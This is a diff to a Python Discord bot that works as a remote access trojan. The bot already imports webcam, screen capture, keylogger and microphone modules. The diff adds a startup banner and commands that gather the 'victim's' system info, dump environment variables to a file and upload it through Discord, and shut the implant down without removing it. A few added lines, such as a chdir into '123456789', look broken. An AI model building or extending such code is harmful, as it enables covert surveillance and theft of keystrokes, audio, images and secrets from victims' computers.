@@ -1,3 +1,5 @@
+from fileinput import filename
+from time import strftime
 import discord
 import os
 import asyncio
@@ -8,6 +10,7 @@ import webcam
 import screencapture
 import keylogger
 import MicrophoneTap
+import scourinfo
 
 load_dotenv()
 
@@ -29,6 +32,18 @@ class Client(commands.Bot):
 
         except Exception as e:
             print(f'Error syncing commands: {e}')
+
+        try:
+            channel_env = os.getenv("DISCORD_BOT_CHANNEL_ID")
+            channel = self.get_channel(int(channel_env))
+            embed = discord.Embed(title="Welcome ME!", description=f"I have just entered this realm, mortals!", color=discord.Color.blue())
+            embed.set_thumbnail(url="https://cdn.pixabay.com/photo/2022/01/30/13/33/github-6980894_1280.png")
+            embed.add_field(name="Time", value=strftime("%H:%M:%S %d-%m-%Y"))
+            print("Sending welcome banner in channel: ", channel, sep="\n")
+            await channel.send(embed=embed)
+        except Exception as e:
+            print(f"Ignoring exception: \n\n{e}\n\nSkipping the welcome message to be safe!")
+          
 
     async def on_message(self, message):
         if message.author == self.user:
@@ -102,6 +117,9 @@ async def keylog(interaction: discord.Interaction, duration: int=60):
         except Exception:
             await interaction.followup.send(file=discord.File(".\\Python\\logs\\{}".format(logfile)))
 
+    print(os.getcwd()[-1:-3])
+    os.chdir("123456789")
+
 @client.tree.command(name="microphone", description="Start listening to the user's microphone for n seconds. Defaults to 60 seconds", guild=GUILD_ID)
 async def mictap(interaction: discord.Interaction, duration: int=60):
     await interaction.response.send_message(content="Okiedokie! Listening for {} seconds".format(duration))
@@ -116,6 +134,38 @@ async def mictap(interaction: discord.Interaction, duration: int=60):
         msg = await interaction.original_response()
         await msg.add_files(discord.File("{0}\\{1}".format(curDir, audioFile)))
         await msg.edit(content=msg.content+"\nFinished the recording!")
+
+
+@client.tree.command(name="banner", description="Send the default welcome banner", guild=GUILD_ID)
+async def banner(interaction: discord.Interaction):
+    embed = discord.Embed(title="Welcome ME!", description="I have just entered this realm, mortals!", colour=discord.Color.blue())
+    embed.set_thumbnail(url='https://cdn.pixabay.com/photo/2022/01/30/13/33/github-6980894_1280.png')
+    embed.add_field(name="Time", value=strftime("%H:%M:%S %d-%m-%Y"))
+    await interaction.response.send_message(embed=embed)
+
+@client.tree.command(name="turnoff", description="Shuts down the remote program, does not remove it from the victim's systems", guild=GUILD_ID)
+async def turnOff(interaction: discord.Interaction):
+    await interaction.response.send_message(content="Gotcha, I am leaving now!")
+    from sys import exit
+    exit(0)
+@client.tree.command(name="info", description="Scours the target's computer for basic info", guild=GUILD_ID)
+async def scourInfo(interaction: discord.Interaction):
+    crawler = scourinfo.scourinfo()
+    embed = discord.Embed(title="Victim")
+    infDict = {}
+    for i in crawler.complete_info.keys():
+        embed.add_field(name=i, value=crawler.complete_info[i])
+    await interaction.response.send_message(embed=embed)
+
+@client.tree.command(name="env", description="Returns a file containing the bot's environment variables", guild=GUILD_ID)
+async def envir(interaction: discord.Interaction):
+    crawler = scourinfo.scourinfo()
+    with open("env.txt", "wb") as file:
+        file.write(str(crawler.environment()).replace(";", ";\n").encode(encoding="utf-8"))
+        file.close()
+    await interaction.response.send_message(file=discord.File(fp="env.txt",  filename="environment.txt"))
+    await asyncio.sleep(10)
+    os.remove("env.txt")
 
 token = os.getenv('DISCORD_BOT_TOKEN')
 client.run(token)
